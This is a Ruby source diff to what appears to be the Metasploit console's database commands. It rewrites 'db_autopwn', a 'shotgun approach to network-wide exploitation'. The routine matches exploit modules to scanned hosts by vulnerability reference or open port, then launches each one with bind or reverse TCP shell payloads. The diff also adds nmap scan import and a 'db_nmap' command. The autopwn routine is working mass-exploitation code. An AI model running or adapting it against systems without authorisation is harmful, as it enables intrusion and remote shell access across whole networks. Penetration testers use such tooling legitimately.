@@ -4,6 +4,19 @@ module Console
 module CommandDispatcher
 module Db
 
+		require 'rexml/document'
+		require 'tempfile'
+		
+		#
+		# Constants
+		#
+
+		PWN_SHOW = 1
+		PWN_XREF = 2
+		PWN_PORT = 4
+		PWN_EXPL = 8
+		PWN_SING = 16
+			
 		#
 		# The dispatcher's name.
 		#
@@ -23,7 +36,8 @@ module Db
 				"db_add_port" => "Add a port to host",
 				"db_autopwn"  => "Automatically exploit everything",
 				"db_import_nessus_nbe" => "Import a Nessus scan result file (NBE)",
-				# "db_import_nmap_xml"   => "Import a Nmap scan results file (-oX)",
+				"db_import_nmap_xml"   => "Import a Nmap scan results file (-oX)",
+				"db_nmap" => "Executes nmap and records the output automatically",
 			}
 		end
 
@@ -35,8 +49,7 @@ module Db
 
 		def cmd_db_services(*args)
 			framework.db.each_service do |service|
-				# print_status("Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
-				print_status("Service: host_id=#{service.host_id} port=#{service.port} proto=#{service.proto} state=#{service.state}")				
+				print_status("Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state} name=#{service.name}")			
 			end
 		end		
 		
@@ -69,6 +82,177 @@ module Db
 			print_status("Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
 		end
 
+		#
+		# A shotgun approach to network-wide exploitation
+		#
+		def cmd_db_autopwn(*args)
+
+			stamp = Time.now.to_f
+			vcnt  = 0
+			rcnt  = 0
+			mode  = 0
+			code  = :bind
+			
+			args.push("-h") if args.length == 0
+			
+			while (arg = args.shift)
+				case arg
+				when '-t'
+					mode |= PWN_SHOW
+				when '-x'
+					mode |= PWN_XREF
+				when '-p'
+					mode |= PWN_PORT
+				when '-e'
+					mode |= PWN_EXPL
+				when '-s'
+					mode |= PWN_SING					
+				when '-r'
+					code = :conn
+				when '-b'
+					code = :bind
+				when '-h'
+					print_status("Usage: db_autopwn [options]")
+					print_line("\t-t   Show all matching exploit modules")
+					print_line("\t-x   Select modules based on vulnerability references")
+					print_line("\t-p   Select modules based on open ports")
+					print_line("\t-s   Only obtain a single shell per target system")
+					print_line("\t-r   Use a reverse connect shell")
+					print_line("\t-b   Use a bind shell on a random port")
+					print_line("\t-h   Display this help text")
+					print_line("")
+					return
+				end
+			end
+
+			matches = {}
+			
+			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|			
+				# Scan all exploit modules for matching references
+				mtype[0].each_module do |n,m|
+					e = m.new
+					
+					#
+					# Match based on vulnerability references
+					#
+					if (mode & PWN_XREF != 0)
+						e.references.each do |r|
+							rcnt += 1
+
+							ref_name = r.ctx_id + '-' + r.ctx_val
+							ref = framework.db.has_ref?(ref_name)
+							
+							if (ref)
+								ref.vulns.each do |vuln|
+									vcnt  += 1
+									serv  = vuln.service
+									xport = serv.port
+									xprot = serv.proto
+									xhost = serv.host.address
+									matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
+								end
+							end
+						end
+					end
+
+					#
+					# Match based on ports alone
+					#
+					if (mode & PWN_PORT != 0)
+						rport = e.datastore['RPORT']
+						if (rport)
+							framework.db.services.each do |serv|
+								next if serv.port.to_i != rport.to_i
+								xport = serv.port
+								xprot = serv.proto
+								xhost = serv.host.address
+								matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
+							end
+						end
+					end					
+				end
+			end
+
+
+			if (mode & PWN_SHOW != 0)
+				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_s} seconds (#{vcnt.to_s} vulns / #{rcnt.to_s} refs)")
+			end
+			
+			idx = 0
+			matches.each_key do |xref|
+				idx += 1
+				
+				begin
+					mod = nil
+
+					if ((mod = framework.modules.create(xref[3])) == nil)
+						print_status("Failed to initialize #{xref[3]}")
+						next
+					end
+
+					if (mode & PWN_SHOW != 0)
+						print_status("Matched #{xref[3]} against #{xref[2].to_s}:#{mod.datastore['RPORT'].to_s}...")
+					end
+					
+					#
+					# The code is just a proof-of-concept and will be expanded in the future
+					#
+					if (mode & PWN_EXPL != 0)
+
+						mod.datastore['RHOST'] = xref[2]
+						mod.datastore['RPORT'] = xref[0].to_s
+
+						if (code == :bind)
+							mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
+							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
+						end
+						
+						if (code == :conn)
+							mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
+							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
+							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s
+							
+							if (mod.datastore['LHOST'] == '127.0.0.1')
+								print_status("Failed to determine listener address for target #{xref[2]}...")
+								next
+							end
+						end
+						
+						next if not mod.autofilter()
+
+						print_status("Launching #{xref[3]} (#{idx.to_s}/#{matches.length.to_s}) against #{xref[2].to_s}:#{mod.datastore['RPORT'].to_s}...")
+
+						begin
+							case mod.type
+							when MODULE_EXPLOIT
+								session = mod.exploit_simple(
+									'Payload'        => mod.datastore['PAYLOAD'],
+									'LocalInput'     => driver.input,
+									'LocalOutput'    => driver.output,
+									'RunAsJob'       => true)
+							when MODULE_AUX
+								session = mod.run_simple(
+									'LocalInput'     => driver.input,
+									'LocalOutput'    => driver.output,
+									'RunAsJob'       => true)			
+							end
+						rescue ::Exception
+							print_status(" >> Exception during launch from #{xref[3]}: #{$!.to_s}")
+						end
+					end
+					
+				rescue ::Exception
+					print_status(" >> Exception from #{xref[3]}: #{$!.to_s}")
+				end
+			end	
+
+		# EOM
+		end
+
+		
+		#
+		# Import Nessus NBE files
+		#
 		def cmd_db_import_nessus_nbe(*args)
 			if (not (args and args.length == 1))
 				print_status("Usage: db_import_nessus_nbe [nessus.nbe]")
@@ -137,113 +321,77 @@ module Db
 			end
 		end
 		
-		def cmd_db_autopwn(*args)
 		
-			print_status("Analyzing module and vulnerability data...")
-			stamp = Time.now.to_f
-			vcnt  = 0
-			rcnt  = 0
-			
-			matches = {}
-			
-			# Scan all exploit modules for matching references
-			framework.exploits.each_module do |n,m|
-				e = m.new
-				e.references.each do |r|
-					rcnt += 1
-					
-					ref_name = r.ctx_id + '-' + r.ctx_val
-					ref = framework.db.has_ref?(ref_name)
-					next if not ref
-
-					ref.vulns.each do |vuln|
-						vcnt  += 1
-						serv  = vuln.service
-						xport = serv.port
-						xprot = serv.proto
-						xhost = serv.host.address
-						matches[[xport,xprot,xhost,'exploit/'+n]]=true
-					end
-				end
+		#
+		# Import Nmap data from a file
+		#
+		def cmd_db_import_nmap_xml(*args)
+			if (not (args and args.length == 1))
+				print_status("Usage: db_import_nmap_xml [nmap.xml]")
+				return
 			end
 			
-			# Scan all auxiliary modules for matching references
-			framework.auxiliary.each_module do |n,m|
-				e = m.new
-				e.references.each do |r|
-					rcnt += 1
-					
-					ref_name = r.ctx_id + '-' + r.ctx_val
-					ref = framework.db.has_ref?(ref_name)
-					next if not ref
-
-					ref.vulns.each do |vuln|
-						vcnt  += 1
-						serv  = vuln.service
-						xport = serv.port
-						xprot = serv.proto
-						xhost = serv.host.address
-						matches[[xport,xprot,xhost,'auxiliary/'+n]]=true
-					end
-				end
+			if (not File.readable?(args[0])) 
+				print_status("Could not read the XML file")
+				return
 			end
 			
-			print_status("Analysis completed in #{(Time.now.to_f - stamp).to_s} seconds (#{vcnt.to_s} vulns / #{rcnt.to_s} refs)")
+			fd = File.open(args[0], 'r')
+			data = fd.read
+			fd.close
 			
-			case args[0]		
-			when '-t', nil
-				matches.each_key do |xref|
-					print_status("Try #{xref[3]} against #{xref[2].to_s}:#{xref[0].to_s}")
-				end
-
-			when '-x'
-				matches.each_key do |xref|
-					
-					begin
-						mod = nil
-						
-						if ((mod = framework.modules.create(xref[3])) == nil)
-							print_status("Failed to initialize #{xref[3]}")
-							next
-						end
-						
-						mod.datastore['RHOST'] = xref[2]
-						mod.datastore['RPORT'] = xref[0].to_s
-						mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
-						mod.datastore['LPORT']   = (rand(0xfff) + 4000).to_s
-
-						next if not mod.autofilter()
-						
-						print_status("Launching #{xref[3]} against #{xref[2].to_s}:#{mod.datastore['RPORT'].to_s}...")
-						
-						begin
-							case mod.type
-							when MODULE_EXPLOIT
-								session = mod.exploit_simple(
-									'Payload'        => mod.datastore['PAYLOAD'],
-									'LocalInput'     => driver.input,
-									'LocalOutput'    => driver.output,
-									'RunAsJob'       => true)
-							when MODULE_AUX
-								session = mod.run_simple(
-									'LocalInput'     => driver.input,
-									'LocalOutput'    => driver.output,
-									'RunAsJob'       => true)			
-							end
-						rescue ::Exception
-							print_status(" >> Exception during launch from #{xref[3]}: #{$!.to_s}")
-						end
-						
-					rescue ::Exception
-						print_status(" >> Exception from #{xref[3]}: #{$!.to_s}")
-					end
-				end	
-			else
-				print_status("Usage: db_autopwn [-t]|[-x]")
-			end
-		
+			load_nmap_xml(data)
 		end
 
+		#
+		# Import Nmap data from a file
+		#
+		def cmd_db_nmap(*args)
+			if (args.length == 0)
+				print_status("Usage: db_nmap [nmap options]")
+				return
+			end
+			
+			fd = Tempfile.new('dbnmap')
+			args.push('-oX', fd.path)
+			args.unshift('nmap')
+
+			system(*args)			
+
+			data = fd.read
+			
+			fd.close
+			
+			load_nmap_xml(data)
+		end		
+		
+		#
+		# Process Nmap XML data
+		#
+		def load_nmap_xml(data)
+			doc = REXML::Document.new(data)
+			doc.elements.each('/nmaprun/host') do |host|
+				addr = host.elements['address'].attributes['addr']
+				host.elements['ports'].elements.each('port') do |port|
+					prot = port.attributes['protocol']
+					pnum = port.attributes['portid']
+					stat = port.elements['state'].attributes['state']
+					name = port.elements['service'].attributes['name']
+					prod = port.elements['service'].attributes['product']
+					xtra = port.elements['service'].attributes['extrainfo']
+
+					next if stat != 'open'
+					
+					host = framework.db.get_host(nil, addr)
+					next if not host
+					
+					service = framework.db.get_service(nil, host, prot.downcase, pnum.to_i)
+					service.name = name
+					service.save
+				end
+			end
+		end
+		
 end
 end
 end
